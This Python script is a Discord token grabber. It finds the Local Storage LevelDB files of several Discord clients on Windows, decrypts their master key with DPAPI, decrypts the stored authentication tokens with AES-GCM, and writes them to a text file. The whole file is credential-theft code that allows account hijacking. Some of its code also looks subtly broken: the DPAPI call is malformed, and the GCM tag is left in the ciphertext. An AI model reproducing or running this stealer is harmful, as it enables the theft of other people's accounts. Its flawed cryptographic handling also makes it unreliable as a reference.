import os
import json
import base64
import re
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import ctypes

TOKEN_PATTERN = r"dQw4w9WgXcQ:([^\"]*)"

APP_DATA = os.getenv("APPDATA")
DISCORD_PATHS = {
    "Discord": os.path.join(APP_DATA, "discord"),
    "Discord Canary": os.path.join(APP_DATA, "discordcanary"),
    "Lightcord": os.path.join(APP_DATA, "Lightcord"),
    "Discord PTB": os.path.join(APP_DATA, "discordptb"),
}

def decrypt_with_dpapi(encrypted_data):
    """Decrypt data using Windows DPAPI."""
    buffer_in = ctypes.create_string_buffer(encrypted_data)
    buffer_out = ctypes.create_string_buffer(len(encrypted_data))
    length = ctypes.c_ulong()
    result = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(buffer_in),
        None,
        None,
        None,
        None,
        0,
        ctypes.byref(buffer_out)
    )
    if not result:
        raise ValueError("DPAPI decryption failed.")
    return buffer_out.raw[:length.value]

def extract_encrypted_key(data):
    """Extract the encrypted key from the JSON data."""
    local_state = json.loads(data)
    encrypted_key = local_state['os_crypt']['encrypted_key']
    return base64.b64decode(encrypted_key)

def decrypt_data(encrypted_data, key):
    """Decrypt data using AES-GCM."""
    encrypted_data = base64.b64decode(encrypted_data)
    nonce = encrypted_data[3:15]
    ciphertext = encrypted_data[15:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt(ciphertext).decode('utf-8')

def get_discord_files(paths):
    """Retrieve LevelDB files from Discord directories."""
    filenames = []
    for path in paths.values():
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(leveldb_path):
            continue
        filenames.extend(
            str(file) for file in Path(leveldb_path).glob("*.ldb")
        )
    return filenames

def extract_tokens(filenames):
    """Extract encrypted tokens from LevelDB files."""
    tokens = []
    token_regex = re.compile(TOKEN_PATTERN)
    for filename in filenames:
        with open(filename, "r", encoding="utf-8") as file:
            for line in file:
                match = token_regex.search(line)
                if match:
                    tokens.append(match.group(1))
    return tokens

def get_key(local_state_path):
    """Retrieve and decrypt the master key from Local State."""
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = file.read()
    encrypted_key = extract_encrypted_key(local_state)
    return decrypt_with_dpapi(encrypted_key[5:])

def get_discord_tokens():
    """Retrieve decrypted Discord tokens."""
    all_tokens = []
    for name, path in DISCORD_PATHS.items():
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            continue
        try:
            master_key = get_key(local_state_path)
            files = get_discord_files({name: path})
            encrypted_tokens = extract_tokens(files)
            for et in encrypted_tokens:
                try:
                    token = decrypt_data(et, master_key)
                    all_tokens.append(token)
                except Exception:
                    continue
        except Exception:
            continue
    return all_tokens

if __name__ == "__main__":
    tokens = get_discord_tokens()
    with open("dstokens.txt", "w") as file:
        for token in tokens:
            file.write(token + "\n")